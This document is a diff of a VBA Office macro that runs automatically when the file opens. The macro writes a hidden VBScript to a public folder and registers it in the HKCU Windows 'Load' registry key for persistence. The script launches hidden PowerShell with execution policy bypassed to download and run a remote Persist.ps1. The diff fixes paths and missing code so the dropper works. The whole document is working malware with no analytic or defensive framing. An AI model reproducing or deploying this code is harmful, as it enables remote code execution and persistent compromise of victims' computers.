@@ -1,8 +1,8 @@
 Sub Auto_Open()
-Execute
+'Execute
 Persist
 Reg
-
+Start
 
 End Sub
 
@@ -20,28 +20,30 @@ End Sub
      
 Public Function Persist() As Variant
  Set fs = CreateObject("Scripting.FileSystemObject")
-    Set a = fs.CreateTextFile("C:\Users\Default\AppData\Roaming\Microsoft\Windows\config.txt", True)
+    Set a = fs.CreateTextFile("C:\Users\Public\config.txt", True)
     a.WriteLine ("Dim objShell")
     a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
     a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('https://xxx.xxx.x.xxx/Persist.ps1'))""")
     a.WriteLine ("objShell.Run command,0")
     a.WriteLine ("Set objShell = Nothing")
     a.Close
-    GivenLocation = "C:\Users\Default\AppData\Roaming\Microsoft\Windows\"
+    GivenLocation = "C:\Users\Public\"
     OldFileName = "config.txt"
     NewFileName = "config.vbs"
     Name GivenLocation & OldFileName As GivenLocation & NewFileName
-    SetAttr "C:\Users\Default\AppData\Roaming\Microsoft\Windows\config.vbs", vbHidden
+    SetAttr "C:\Users\Public\config.vbs", vbHidden
 End Function
 
 Public Function Reg() As Variant
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Default\AppData\Roaming\Microsoft\Windows\config.vbs", "REG_SZ"
+WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Public\config.vbs", "REG_SZ"
 Set WshShell = Nothing
+
+End Function
 
 Public Function Start() As Variant
  Const HIDDEN_WINDOW = 0
         strComputer = "."
-        Shell "wscript C:\Users\Default\AppDaa\Roaming\Microsoft\Windows\config.vbs",vbNormalFocus
+        Shell "wscript C:\Users\Public\config.vbs", vbNormalFocus
       
 End Function
